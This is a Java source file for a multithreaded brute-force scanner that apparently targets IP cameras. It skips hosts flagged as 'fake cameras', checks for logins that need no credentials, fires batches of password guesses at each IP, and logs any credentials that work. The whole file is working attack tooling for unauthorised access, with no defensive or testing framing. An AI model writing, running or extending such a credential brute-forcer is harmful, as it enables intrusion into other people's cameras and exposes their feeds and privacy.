package scanner.brute;

import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;

import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.concurrent.*;

import static scanner.brute.AuthState.NOT_AVAILABLE;
import static scanner.brute.AuthState.NOT_REQUIRED;

@Slf4j
public class BruteForceScanner {

    private final ExecutorService executorService = Executors.newFixedThreadPool(20);

    @SneakyThrows
    public void brute(String ip, String[] passwords) {
        AuthStateStore auth = new AuthStateStore();

        if (IpBruteFilter.excludeFakeCamera(ip))
            return;

        checkEmptyCredentials(auth, ip);

        HashSet<BruteForceExecutor> requests = new HashSet<>();
        for (int i = 0; i < passwords.length; i++) {
            if (Arrays.asList(NOT_REQUIRED, NOT_AVAILABLE).contains(auth.getState()))
                break;

            requests.add(new BruteForceExecutor(ip, passwords[i]));
            if (requests.size() == 5 || i == passwords.length - 1) {
                List<Future<AuthStateStore>> futures = executorService.invokeAll(requests, 2L, TimeUnit.SECONDS);
                for (Future<AuthStateStore> future : futures) {
                    try {
                        AuthStateStore authNew = future.get();
                        if (authNew.isAuth() && !auth.isAuth()) {
                            auth.setCredentials(authNew.getCredentials());
                            auth.setState(authNew.getState());
                        }
                    } catch (CancellationException | ExecutionException | InterruptedException ce) {
                        auth.setState(NOT_AVAILABLE);
                        future.cancel(true);
                    }
                }
                requests.clear();
            }
        }
        switch (auth.getState()) {
            case AUTH:
            case NOT_REQUIRED:  log.info("{} => {}", ip, auth.getCredentials().orElse("Auth not required")); break;
            case UNKNOWN_STATE: // maybe basic request must be changed manually
            case NOT_AVAILABLE: log.debug("{} => skipped, not available", ip); // maybe it will be deleted as "bad cameras"
            case NOT_AUTH:
            default: break;
        }
    }

    private void checkEmptyCredentials(AuthStateStore auth, String ip) {
        try {
            Future<AuthStateStore> emptyCredentialsFuture = executorService.submit(new BruteForceExecutor(ip, null));
            AuthState emptyCredentialsState = emptyCredentialsFuture.get(3L, TimeUnit.SECONDS).getState();
            if (emptyCredentialsState == AuthState.AUTH)
                auth.setState(NOT_REQUIRED);
        } catch (TimeoutException | CancellationException | ExecutionException | InterruptedException xep) {
            auth.setState(NOT_AVAILABLE);
        }
    }

}